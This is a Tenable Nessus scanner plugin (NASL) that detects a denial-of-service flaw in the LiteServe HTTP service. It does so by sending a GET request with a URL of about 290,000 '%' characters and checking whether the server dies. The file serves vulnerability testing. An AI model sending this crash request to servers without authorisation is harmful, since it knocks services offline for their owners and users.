# 
# (C) Tenable Network Security, Inc.
#

# Affected:
# Webseal 3.8
#
# *unconfirmed*


include("compat.inc");

if(description)
{
 script_id(11155);
 script_version ("$Revision: 1.14 $");
 script_xref(name:"OSVDB", value:"55342");

 script_name(english:"LiteServe HTTP Service Malformed URL Decoding Remote DoS");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server may be vulnerable to a denial of service attack." );
 script_set_attribute(attribute:"description", value:
"The remote web server does not respond after it receives a URL
consisting of a long string of '%' characters. 

Note that if the web server is protected with some sort of Intrusion
Prevention Systems (IPS), this may be a false-positive." );
 script_set_attribute(attribute:"solution", value:
"If the web server does indeed crash when scanned with this plugin,
then upgrade or replace the server, protect it with a proxy, or
firewall it." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P" );

script_end_attributes();

 script_summary(english: "Sending a long string of % kills LiteServe");
 script_category(ACT_DENIAL);
 
 script_copyright(english:"This script is Copyright (C) 2002-2009 Tenable Network Security, Inc.");
 script_family(english: "Web Servers");
 script_dependencie("find_service1.nasl", "httpver.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

#

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);

if (http_is_dead(port: port)) exit(0);

r = http_send_recv3(method:"GET", port: port, version: 10,
  item: "/" + crap(data: "%",length: 290759));

if (http_is_dead(port: port, retry: 3)) { security_warning(port); }
